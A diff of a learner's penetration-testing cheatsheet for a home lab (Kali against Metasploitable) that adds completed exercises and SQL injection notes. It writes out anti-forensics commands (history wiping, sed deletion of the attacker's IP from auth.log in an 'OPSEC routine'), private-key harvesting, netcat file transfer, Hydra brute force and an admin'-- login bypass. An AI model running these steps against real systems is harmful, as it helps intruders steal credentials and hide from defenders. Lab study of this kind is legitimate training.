@@ -64,30 +64,51 @@ what i found on Metasploitable:
 why it matters: if a root cron job runs a script i can write to
                i edit that script and it executes as root — instant privesc
 
-Disable history: [TAUGHT — need to practice]
+Disable history: [DONE]
 unset HISTFILE && export HISTSIZE=0
 what i learned: unset HISTFILE stops bash writing history to disk
                export HISTSIZE=0 clears memory of commands in session
 why it matters: first thing i run after getting a shell so nothing gets logged
-my practice task: run on Metasploitable, type commands, check history is empty
 
-Clear history file: [TAUGHT — need to practice]
+Clear history file: [DONE]
 cat /dev/null > ~/.bash_history
 what i learned: /dev/null is empty — piping it overwrites the file with nothing
 why it matters: clears commands typed before i disabled history
-my practice task: run on Metasploitable, then cat ~/.bash_history to confirm empty
 
-Surgical log clean: [TAUGHT — need to practice]
-sed -i '/MY_IP/d' /var/log/auth.log
+Surgical log clean: [DONE]
+sudo sed -i '/192.168.56.102/d' /var/log/auth.log
+sudo sed -i '/msfadmin/d' /var/log/auth.log
 what i learned: sed processes text line by line
                -i edits the file directly
-               /MY_IP/d deletes every line containing my IP
+               /pattern/d deletes every line containing that pattern
 why it matters: removes only my entries — rest of log stays normal
                full wipe is obvious to defenders, surgical is not
-my practice task:
-   echo "fake entry 1.2.3.4" >> /var/log/auth.log
-   sed -i '/1.2.3.4/d' /var/log/auth.log
-   grep "1.2.3.4" /var/log/auth.log — should return nothing
+important: use exact IP not partial match
+           some session lines have no IP — also clean by username
+           always verify with grep after cleaning
+
+Find private keys on target: [DONE]
+find / -name "id_rsa" 2>/dev/null
+find / -name "*.pem" 2>/dev/null
+find / -name "*.key" 2>/dev/null
+what i found on Metasploitable:
+               /home/msfadmin/.ssh/id_rsa — private SSH key
+               /etc/mysql/server-key.pem  — MySQL SSL key
+               /etc/mysql/client-key.pem  — MySQL client key
+               /etc/bind/rndc.key         — DNS key
+why it matters: private SSH key can be copied and used to access
+               other servers that trust this key — no password needed
+
+Full OPSEC routine — do this every session: [DONE]
+1. SSH into target
+2. unset HISTFILE && export HISTSIZE=0
+3. do your work
+4. cat /dev/null > ~/.bash_history
+5. sudo sed -i '/192.168.56.102/d' /var/log/auth.log
+6. sudo sed -i '/msfadmin/d' /var/log/auth.log
+7. verify: grep "192.168.56.102" /var/log/auth.log
+8. history — should return nothing
+9. exit
 
 ======================================================
 WINDOWS
@@ -169,11 +190,15 @@ Banner grab with netcat: [DONE]
 nc TARGET_IP PORT
 what i learned: connects to a port and reads whatever the service sends back
 
-Send raw HTTP GET: [TAUGHT — need to practice]
+Send raw HTTP GET: [DONE]
 nc TARGET_IP 80
 then type: GET / HTTP/1.0 and press Enter twice
 what i learned: manually sends HTTP request without a browser
-my practice task: nc 192.168.56.104 80 then send the GET request
+what it revealed on Metasploitable:
+- Apache 2.2.8 Ubuntu — old version
+- PHP 5.2.4 — ancient, multiple exploits
+- WebDAV enabled — file upload possible
+- web apps: phpMyAdmin, DVWA, Mutillidae, TWiki, WebDAV
 
 Capture traffic: [DONE]
 wireshark
@@ -184,23 +209,29 @@ ip.addr == TARGET_IP
 Filter FTP in Wireshark: [DONE]
 ip.addr == TARGET_IP && ftp
 
-File transfer via Python HTTP server: [TAUGHT — need to practice]
+File transfer via Python HTTP server: [DONE]
 on Kali:   python3 -m http.server 8080
 on target: wget http://192.168.56.102:8080/filename
-my practice task: serve a file from Kali, download it on Metasploitable
+what i learned: Kali becomes a web server
+               target downloads the file with wget
+               Kali terminal shows GET request when file is downloaded
 
-File transfer via netcat send: [TAUGHT — need to practice]
+File transfer via netcat send: [DONE]
 nc TARGET_IP 4444 < file.txt
+what i learned: sends file contents through netcat to listener
 
-File transfer via netcat receive: [TAUGHT — need to practice]
+File transfer via netcat receive: [DONE]
 nc -lvp 4444 > file.txt
 what i learned: -l listen, -v verbose, -p port number
-my practice task: transfer cheatsheet both directions between Kali and Metasploitable
+               opens a listener and saves whatever arrives to a file
 
-Check routing table: [TAUGHT — need to practice]
+Check routing table: [DONE]
 route -n
-what i learned: shows how my machine decides where to send traffic
-my practice task: run on Kali, find the default gateway
+what i found on Kali:
+default gateway:  10.0.2.1    via eth1 — internet traffic goes here
+lab network:      192.168.56.0 via eth0 — direct connection to Metasploitable
+eth0: Host-Only network — lab
+eth1: NAT network — internet
 
 Check ARP table: [DONE]
 arp -a
@@ -216,15 +247,20 @@ ssh user@IP
 Connect with private key: [DONE — used in Bandit]
 ssh user@IP -i keyfile
 
-Connect on custom port: [TAUGHT]
+Connect on custom port: [DONE — used in Bandit]
 ssh user@IP -p 2222
 
-Generate key pair: [DONE]
+Connect to old server with RSA key: [DONE]
+ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@IP
+what i learned: Metasploitable uses old SSH — modern Kali rejects it by default
+               these flags force Kali to accept the old key type
+
+Generate key pair: [TAUGHT — need to practice]
 ssh-keygen -t rsa -b 4096
 what i learned: creates id_rsa (private) and id_rsa.pub (public)
                private key stays on my machine, public goes on target
 
-Copy public key to target: [DONE]
+Copy public key to target: [TAUGHT — need to practice]
 ssh-copy-id user@IP
 
 Port forwarding: [TAUGHT — practice in Stage 4]
@@ -234,10 +270,6 @@ what i learned: tunnels a remote port to my local machine
 
 Brute force SSH: [STAGE 3]
 hydra -l user -P wordlist ssh://IP
-
-Find private keys on target: [TAUGHT]
-find / -name "id_rsa" 2>/dev/null
-my practice task: run on Metasploitable — check if any keys exist
 
 ======================================================
 PROXYCHAINS AND TOR
@@ -275,6 +307,10 @@ Full recon tool: [DONE]
 python3 ~/red-team-tools/python-tools/recon.py
 what it does: combines scanner and banner grabber in one tool
 
+Advanced recon tool: [DONE]
+python3 ~/red-team-tools/python-tools/recon_advanced.py
+what it does: scanner + banner grabber + service dictionary + table output + timestamp
+
 ======================================================
 MY LAB
 ======================================================
@@ -302,9 +338,9 @@ Port 80   HTTP        Apache 2.2.8        HIGH
 Port 111  RPC                             LOW
 Port 139  SMB         Samba 3.0.20        CRITICAL
 Port 445  SMB         Samba 3.0.20        CRITICAL
-Port 512  rexec                           HIGH
+Port 512  rexec       Where are you?      HIGH
 Port 513  rlogin                          HIGH
-Port 514  rsh                             HIGH
+Port 514  rsh         name resolution     HIGH
 Port 1099 Java RMI                        MEDIUM
 Port 1524 Bindshell   root shell open     CRITICAL
 Port 2049 NFS                             MEDIUM
@@ -316,21 +352,108 @@ Port 6667 IRC         UnrealIRCd          CRITICAL
 Port 8180 Tomcat      Apache Tomcat       HIGH
 
 ======================================================
+WEB APP SECURITY — SQL INJECTION
+======================================================
+
+What SQLi is:
+attacker interferes with SQL queries an app makes to its database
+single quote ' is the key character — breaks out of string context
+-- comments out rest of query
+
+What SQL is:
+language used to talk to databases
+every login runs a query like:
+SELECT * FROM users WHERE username='ahmed' AND password='1234'
+
+Basic login bypass:
+username field input: admin'--
+query becomes: SELECT * FROM users WHERE username='admin'--' AND password=''
+password check is commented out — logged in as admin without password
+
+Why ' works:
+SQL strings are wrapped in single quotes
+injecting ' breaks out of the string and lets you write your own SQL
+that is the entire concept of SQLi in one sentence
+
+Types of SQLi:
+
+IN-BAND — attack and result use same channel
+  Error-based  — force DB errors to reveal version and structure info
+  Union-based  — combine queries with UNION to pull extra data from DB
+
+INFERENTIAL (BLIND) — no data transferred directly, no visible output
+  Boolean-based — send true/false conditions, observe page differences
+                  true condition: page loads normally
+                  false condition: page changes or errors
+                  extract data character by character based on differences
+  Time-based    — send sleep command inside query
+                  if page delays — condition is true
+                  if page loads instantly — condition is false
+                  no visible page change, only timing tells you the answer
+
+OUT-OF-BAND — DB sends data to attacker external server
+              DB makes DNS lookup to attacker.com carrying stolen data
+              used when in-band and inferential are both blocked
+              never see response in app — arrives at your external server
+
+Key SQL vocabulary:
+SELECT * FROM users     — get all data from users table
+WHERE username='ahmed'  — filter condition
+AND / OR                — combine conditions
+'                       — breaks string context — injection point
+--                      — comments out rest of query
+UNION                   — combines two query results into one
+ORDER BY 1,2,3          — used to detect number of columns
+NULL                    — used in column count detection
+
+Testing perspective:
+Black-box — only URL, no source code, test like real attacker
+White-box — have source code, more thorough testing possible
+
+Finding SQLi:
+submit ' and look for errors or behavior changes
+submit '' two quotes and see if error disappears
+submit SQL specific syntax and observe differences
+
+Column count detection with ORDER BY:
+ORDER BY 1 — works
+ORDER BY 2 — works
+ORDER BY 3 — error = 2 columns exist
+
+UNION attack — requires:
+1. know number of columns in original query
+2. know compatible data types of each column
+3. use UNION SELECT to pull target data from other tables
+
+Exploit approaches:
+Error-based:   enter SQL characters, look for error messages revealing DB info
+Union-based:   find column count with ORDER BY, then UNION SELECT stolen data
+Boolean-based: submit true/false conditions, observe page differences
+Time-based:    submit sleep condition, measure response delay
+
+Prevention:
+Primary:    parameterized queries — prepared statements
+            never put user input directly into SQL query
+Additional: input validation, WAF, least privilege DB accounts
+
+======================================================
 THINGS I STILL NEED TO PRACTICE
 ======================================================
 
-[ ] disable history on Metasploitable, run commands, verify history is empty
-[ ] clear bash history file, verify it is empty
-[ ] add fake log entry, delete with sed, verify it is gone
-[ ] send raw HTTP GET to port 80 using netcat manually
-[ ] transfer a file Kali to Metasploitable via Python HTTP server
-[ ] transfer a file both directions via netcat
-[ ] run route -n on Kali and identify the default gateway
-[ ] find all private keys on Metasploitable
-[ ] connect to SSH on custom port
-[ ] practice stealth scan in Stage 3
+[ ] ssh-keygen and ssh-copy-id — generate and deploy key pair
+[ ] practice stealth scan — Stage 3
+[ ] port forwarding — Stage 4
 
-[x] run crontab -l and cat /etc/crontab on Metasploitable — DONE
+[x] disable history — DONE
+[x] clear bash history file — DONE
+[x] surgical log clean by IP and username — DONE
+[x] full OPSEC routine from memory — DONE
+[x] find private keys on Metasploitable — DONE
+[x] run route -n and understand routing table — DONE
+[x] send raw HTTP GET via netcat — DONE
+[x] transfer file Kali to Metasploitable via Python HTTP server — DONE
+[x] transfer file via netcat both directions — DONE
+[x] run crontab -l and cat /etc/crontab — DONE
 [x] run nmap -sC and read script output — DONE
 [x] run nmap -sV and identify all services — DONE
 [x] find SUID binaries on Metasploitable — DONE
@@ -340,3 +463,4 @@ THINGS I STILL NEED TO PRACTICE
 [x] grep failed and accepted logins from auth.log — DONE
 [x] built 4 Python tools from scratch — DONE
 [x] set up GitHub and pushed all tools — DONE
+[x] watched first SQLi video — introduction complete — DONE
